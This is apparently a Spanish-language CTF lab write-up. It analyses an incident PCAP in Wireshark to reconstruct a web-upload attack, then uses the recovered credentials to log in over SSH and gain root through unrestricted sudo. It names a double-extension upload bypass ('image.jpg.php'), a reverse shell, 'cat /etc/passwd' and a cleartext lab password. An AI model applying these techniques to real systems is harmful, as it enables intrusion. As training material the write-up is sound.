
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmapp
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 10.0p2 Debian |
| 80 | HTTP | Gunicorn (Python WSGI) |

El hostname que nmap resuelve es `gatekeeperhr.com`.

---

## 2. Enumeración web — ticket SOC

```bash
curl http://172.17.0.2
```

La página sirve un ticket de incidente: **SOC-LAB // TICKET #PGN-2026-0417 — El caso de Pinguinito**. El escenario: un archivo sospechoso apareció en el directorio de subidas de imágenes de una tienda online y el usuario `pinguinito` dejó de poder autenticarse poco después.

Se ofrecen dos evidencias para descargar:

```
/descargas/incidente_pinguino.pcap
/descargas/threat_intel_feed.json
```

Y la interfaz de preguntas en `/caso` — 9 preguntas que reconstruyen la cadena de ataque.

---

## 3. Análisis forense del PCAP

Se abre `incidente_pinguino.pcap` con Wireshark y se responden las 9 preguntas del caso. Las pistas del panel orientan cada búsqueda.

---

### Q1 — IP del atacante

Filtro:

```
http.request.method == "POST"
```

Solo una IP realiza peticiones POST con subidas de archivos: **198.51.100.23**

---

### Q2 — Atribución geográfica

Se consulta `threat_intel_feed.json` buscando la entrada que coincide con `198.51.100.23`:

```json
{
  "ip": "198.51.100.23",
  "country": "Vietnam",
  ...
}
```

País: **Vietnam**

---

### Q3 — User-Agent del atacante

Siguiendo el TCP stream de cualquier petición POST del atacante (clic derecho → Follow → TCP Stream):

```
User-Agent: Mozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot)
```

---

### Q4 — Endpoint de subida

Columna Info de las peticiones POST filtradas anteriormente:

```
POST /reviews/upload.php
```

---

### Q5 — Directorio de subidas

Se observan las peticiones GET previas a la subida. El atacante prueba rutas con GET hasta obtener un 200/403 en lugar de 404:

```
GET /reviews/uploads/   →  200 OK
```

Directorio de subidas: **/reviews/uploads/**

---

### Q6 — Archivo malicioso

El atacante hace dos intentos POST a `/reviews/upload.php`. Comparando el campo `filename` de cada petición multipart:

- Primer intento: `image.php` — bloqueado por el filtro de extensiones (respuesta de error)
- Segundo intento: `image.jpg.php` — **subida exitosa** (bypass de doble extensión)

El servidor filtra la extensión final pero no valida que no haya extensiones adicionales antes. Con `.jpg.php` el archivo se interpreta como PHP.

---

### Q7 — Puerto de la reverse shell

Filtro para aislar el tráfico entre servidor y atacante tras la petición GET al archivo subido:

```
ip.addr == 172.17.0.2 && ip.addr == 198.51.100.23
```

Justo después del GET a `image.jpg.php` arranca un nuevo flujo TCP saliente del servidor hacia el atacante en el puerto **8080**.

---

### Q8 — Fichero leído por el atacante

Se sigue el TCP stream del flujo hacia el puerto 8080 (clic derecho → Follow → TCP Stream). El contenido muestra la sesión de shell inversa. Entre los comandos ejecutados aparece:

```bash
cat /etc/passwd
```

Fichero: **/etc/passwd**

---

### Q9 — Usuario afectado

Continuando la lectura del mismo stream, el atacante ejecuta un script interno de reset de contraseña. El nombre del usuario que modifica es **pinguinito**.

Las credenciales resultantes quedan en texto claro dentro del tráfico:

```
pinguinito:Tr0pic4l-Pingu_99!
```

---

## 4. Acceso SSH

Con las credenciales extraídas del PCAP:

```bash
ssh pinguinito@172.17.0.2
# contraseña: Tr0pic4l-Pingu_99!
```

```
Linux 0e1369cb67ea 6.12.107+deb13-amd64
pinguinito@0e1369cb67ea:~$
```

---

## 5. Escalada a root — sudo sin restricciones

```bash
sudo -l
```

```
User pinguinito may run the following commands on 0e1369cb67ea:
    (ALL) NOPASSWD: ALL
```

`NOPASSWD: ALL` significa que pinguinito puede ejecutar cualquier binario como cualquier usuario sin introducir contraseña. Un solo comando:

```bash
sudo bash
```

```bash
root@0e1369cb67ea:/home/pinguinito# id
uid=0(root) gid=0(root) groups=0(root)
```